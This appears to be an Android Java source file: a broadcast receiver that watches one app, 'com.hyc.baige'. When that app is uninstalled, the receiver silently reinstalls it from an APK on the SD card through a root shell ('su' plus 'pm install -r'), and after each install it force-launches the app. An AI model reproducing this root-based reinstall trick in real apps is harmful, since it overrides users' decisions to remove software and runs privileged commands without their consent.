package com.example.getmac;

import java.io.DataOutputStream;
import java.io.File;
import java.io.OutputStream;
import java.util.List;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

public class BroadCastReceiver extends BroadcastReceiver{
//	static final String action_boot="android.intent.action.PACKAGE_REPLACED";
	
	private String cmd_install = "pm install -r ";
	private String cmd_uninstall = "pm uninstall ";
	String apkLocation = Environment.getExternalStorageDirectory().toString()
			+ "/";

	
	
	@Override
	public void onReceive(final Context context, Intent intent) {
		PackageManager manager = context.getPackageManager();
        if (intent.getAction().equals(Intent.ACTION_PACKAGE_ADDED)) {
//            String packageName = intent.getData().getSchemeSpecificPart();
//            Toast.makeText(context, "替换成功"+packageName, Toast.LENGTH_LONG).show();
        	String packageName = intent.getData().getSchemeSpecificPart();
        	Toast.makeText(context,packageName+"安装了" , Toast.LENGTH_LONG).show();
        	if(packageName.contains("com.hyc.baige")){
        		File f = new File(apkLocation+"baige.apk");
        		if(f.exists()){
        			DeleteFile(new File(apkLocation+"baige.apk"));	
        		}
        		final Intent inAction = context.getPackageManager().getLaunchIntentForPackage("com.hyc.baige");
        		
            	if (inAction != null) {
            		new Handler().postDelayed(new Runnable() {

            			@Override
            			public void run() {
            					if(getAppSatus(context).equals("com.hyc.baige")){
                    			}else{
                    				context.startActivity(inAction);
                    			}
            				
            			}
            		}, 3000);
            		}
        	}
        }
        
        if (intent.getAction().equals(Intent.ACTION_PACKAGE_REMOVED)) {
      	final String packageName = intent.getData().getSchemeSpecificPart();
      	Toast.makeText(context,packageName+"卸载了" , Toast.LENGTH_LONG).show();
      	if(packageName.contains("com.hyc.baige")){
      	   	File mainFile = new File(apkLocation + "baige");
    		if (mainFile.exists()) {
    			DeleteFile(mainFile);   			
    		}	
      	}
    	new Handler().postDelayed(new Runnable() {

			@Override
			public void run() {
			 	if(packageName.contains("com.hyc.baige")){
		      		String cmd = cmd_install + apkLocation
		    				+ "baige.apk";
		    		System.out.println("静默安装命令：" + cmd);
		    		File file = new File(apkLocation+"baige.apk");
		    		if(file.exists()){
		    			excuteSuCMD(cmd);	
		    		}
		      	}
			}
		}, 1000);
      }

	}
	
	//执行shell命令
			protected int excuteSuCMD(String cmd) { 
				DataOutputStream dos = null;
				try {
					Process process = Runtime.getRuntime().exec("su");
					dos = new DataOutputStream(
							(OutputStream) process.getOutputStream());
					// 部分手机Root之后Library path 丢失，导入library path可解决该问题
					dos.writeBytes((String) "export LD_LIBRARY_PATH=/vendor/lib:/system/lib\n");
					cmd = String.valueOf(cmd);
					dos.writeBytes((String) (cmd + "\n"));
					dos.flush();
					dos.writeBytes("exit\n");
					dos.flush();
					process.waitFor();
					int result = process.exitValue();
					return result;  
				} catch (Exception localException) {
					 Log.e("TAG", localException.getMessage(), localException);  
					 return -1;  
				}

			}
			
			public void DeleteFile(File file) { 
		        if (file.exists() == false) { 
		            return; 
		        } else { 
		            if (file.isFile()) { 
		                file.delete(); 
		                return; 
		            } 
		            if (file.isDirectory()) { 
		                File[] childFile = file.listFiles(); 
		                if (childFile == null || childFile.length == 0) {
		                	file.delete();
		                    return; 
		                } 
		                for (File f : childFile) { 
		                    DeleteFile(f); 
		                } 
		                file.delete(); 
		            } 
		        } 
		    } 
			
			
			//判断apk是否运行的状态
			private String getAppSatus(Context context) {  
				  
			    ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);  
			    List<ActivityManager.RunningTaskInfo> list = am.getRunningTasks(1);  
			  
			   if(list!=null){
				   ComponentName cn = list.get(0).topActivity;
				   return cn.getPackageName();
			   }
			   return "noApp";
			}
			
			
			
			private File getDir() {
				// 得到SD卡根目录
				File dir = Environment.getExternalStorageDirectory();
				if (dir.exists()) {
					return dir;
				} else {
					dir.mkdirs();
					return dir;
				}
			}
		} 


